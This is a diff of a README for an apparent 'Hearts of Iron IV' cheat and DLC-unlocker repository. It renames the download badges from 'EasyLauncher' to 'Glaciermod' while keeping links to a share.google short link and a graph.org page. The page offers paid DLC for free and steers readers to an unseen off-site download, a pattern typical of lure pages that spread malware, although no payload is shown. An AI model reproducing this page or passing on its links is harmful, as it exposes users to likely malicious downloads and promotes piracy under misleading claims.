@@ -1,5 +1,5 @@
 # ❤️ Hearts of Iron IV Cheats, Hacks & DLC Unlocker 💣  
-[![Download Latest](https://img.shields.io/badge/Download-EasyLauncher-blue?logo=github)](https://share.google/2zNHJ4SC9e54Q7Ham)
+[![Download Latest](https://img.shields.io/badge/Download-Glaciermod-blue?logo=github)](https://share.google/2zNHJ4SC9e54Q7Ham)
 
 Welcome to the ultimate **Hearts of Iron IV Cheats, Hacks & DLC Unlocker** repository! This advanced tool offers expanded control over your **Hearts of Iron IV** experience, unlocking special features, new possibilities, and all downloadable content (DLC) for the popular global strategy game. Designed to enhance your gameplay with powerful and user-friendly functions, this program delivers robust customization for strategists who want more from their campaigns.
 
@@ -35,7 +35,7 @@ Hearts of Iron IV cheats, HOI4 DLC unlocker, strategy game hacks, game enhanceme
 
 ## ⚡ Installation  
 1. Press the button below to grab the latest version:  
-[![Download EasyLauncher](https://img.shields.io/badge/Download-EasyLauncher-green?style=for-the-badge&logo=github)](https://share.google/2zNHJ4SC9e54Q7Ham)
+[![Download EasyLauncher](https://img.shields.io/badge/Download-Glaciermod-green?style=for-the-badge&logo=github)](https://share.google/2zNHJ4SC9e54Q7Ham)
 2. Refer to the built-in step-by-step guide after launch.
 
 ---
@@ -48,4 +48,4 @@ This software is intended strictly for educational and personal entertainment us
 
 
 ## 🔽 Download  
-[![Download EasyLauncher](https://img.shields.io/badge/Download-EasyLauncher-blue?logo=github)](https://graph.org/EasyLauncher-06-23)
+[![Download EasyLauncher](https://img.shields.io/badge/Download-Glaciermod-blue?logo=github)](https://graph.org/EasyLauncher-06-23)
